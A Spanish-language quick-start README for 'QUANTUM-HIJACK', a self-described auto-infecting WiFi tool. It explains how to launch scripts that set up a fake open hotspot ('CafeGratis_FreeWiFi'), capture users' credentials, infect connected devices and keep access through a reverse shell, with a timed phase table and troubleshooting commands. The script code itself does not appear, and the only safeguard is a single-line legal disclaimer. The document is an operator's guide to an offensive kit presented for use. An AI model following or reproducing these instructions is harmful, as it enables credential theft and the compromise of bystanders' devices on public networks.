# QUANTUM-HIJACK - GUÍA RÁPIDA

## 🚀 INICIO RÁPIDO

### Opción 1: Ejecución Automática Completa (RECOMENDADO)
```bash
sudo ./evento.sh
```
Ejecuta TODAS las fases automáticamente en 6 minutos.

### Opción 2: Ejecución Manual (Debug)
```bash
# Terminal 1 - Activar modo monitor
sudo bash setup.sh

# Terminal 2 - Crear WiFi falso (dejar corriendo)
sudo python3 entangle.py

# Terminal 3 - Capturar credenciales (dejar corriendo)
sudo python3 quantum_interceptor.py

# Terminal 4 - Infectar dispositivos (dejar corriendo)
sudo python3 propagator.py

# Terminal 5 - Ver dashboard
python3 dashboard.py
```

## ⚙️ VERIFICACIÓN

```bash
bash verificar.sh
```

## 📝 FASES (6 minutos total)

| Tiempo | Fase | Script | Estado |
|--------|------|--------|--------|
| 0:00 | **Setup** | setup.sh | Activar modo monitor |
| 0:30 | **Entangle** | entangle.py | Crear WiFi CafeGratis_FreeWiFi |
| 1:00 | **Intercept** | quantum_interceptor.py | Capturar credenciales |
| 2:00 | **Propagate** | propagator.py | Infectar dispositivos |
| 4:00 | **Dashboard** | dashboard.py | Ver resultados |
| 6:00 | **FIN** | - | Presionar Ctrl+C |

## 🔍 WIFI FALSO

- **SSID:** CafeGratis_FreeWiFi
- **Seguridad:** ABIERTA (sin contraseña)
- **IP Gateway:** 192.168.1.1
- **Rango DHCP:** 192.168.1.2-100

## 🎯 OBJETIVOS

✅ Activar modo monitor automáticamente
✅ Crear WiFi falso abierto
✅ Capturar credenciales HTTPS
✅ Infectar dispositivos conectados
✅ Establecer persistencia (reverse shell)
✅ Mostrar dashboard con infectados
✅ Desactivar modo monitor al terminar

## 📊 ARCHIVOS DE SALIDA

```
logs/
  └── captured_credentials.json      # Credenciales capturadas

infected_devices/
  └── infected.json                  # Dispositivos infectados

payloads/
  └── [persistence scripts]          # Scripts de persistencia

capture/
  └── [pcap files]                   # Tráfico capturado
```

## 🔓 CREDENCIALES DE PRUEBA

Para testing sin dispositivos reales, el dashboard muestra datos DEMO:

- **Device 1:** Samsung S24 (Bluetooth)
- **Device 2:** iPhone 15 (WiFi Direct)
- **Device 3:** Lenovo Laptop (NFC)

## ⚠️ IMPORTANTE

1. **Requiere ROOT:** Todos los scripts deben ejecutarse con sudo
2. **Kali Linux:** Diseñado para Kali Linux 2024+
3. **Conexión Real:** Para máxima efectividad, necesita dispositivos reales conectados
4. **Legal:** Solo usar en laboratorios autorizados/pentest legales

## 🆘 TROUBLESHOOTING

**Error: "Device not found"**
```bash
# Verificar interfaz WiFi disponible
iw dev
# O instalar drivers
sudo apt install realtek-rtl8188eus
```

**Error: "Permission denied"**
```bash
# Usar sudo en todos los scripts
sudo ./evento.sh
sudo python3 dashboard.py
```

**WiFi no aparece**
```bash
# Reiniciar servicio WiFi
sudo systemctl restart networking
# O verificar interfaz
ifconfig
```

## 📞 SOPORTE

Revisar `README_FINAL.md` para documentación completa.

---
**v1.0** | QUANTUM-HIJACK | Auto-Infecting WiFi Propagation Tool
